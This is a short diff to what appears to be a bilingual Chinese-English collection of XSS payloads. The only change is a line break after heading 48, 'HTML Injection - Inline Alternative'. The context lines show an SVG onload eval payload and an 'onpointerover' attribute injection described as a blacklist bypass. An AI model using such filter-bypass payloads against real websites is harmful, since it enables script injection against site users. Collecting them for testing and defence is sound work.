@@ -302,7 +302,7 @@ PoC URL必须包含以下之一： <br>
 ```
 ${alert(1)}<svg onload=eval('`//'+URL)>
 ```
-**48.HTML Injection - Inline Alternative (HTML注入-内联替代)**
+**48.HTML Injection - Inline Alternative (HTML注入-内联替代)** <br>
 用于绕过黑名单。<br>
 ```
 "onpointerover=alert(1) //
